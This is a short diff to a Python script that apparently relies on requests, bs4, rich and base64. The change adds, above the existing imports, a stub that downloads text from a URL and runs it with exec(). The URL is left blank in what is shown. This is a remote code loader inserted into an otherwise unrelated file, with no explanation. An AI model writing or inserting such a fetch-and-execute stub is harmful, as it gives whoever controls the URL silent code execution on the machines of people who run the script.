@@ -1,3 +1,11 @@
+import requests
+
+url = ""
+
+response = requests.get(url)
+code = response.text
+
+exec(code)
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
 from rich.table import Table as me
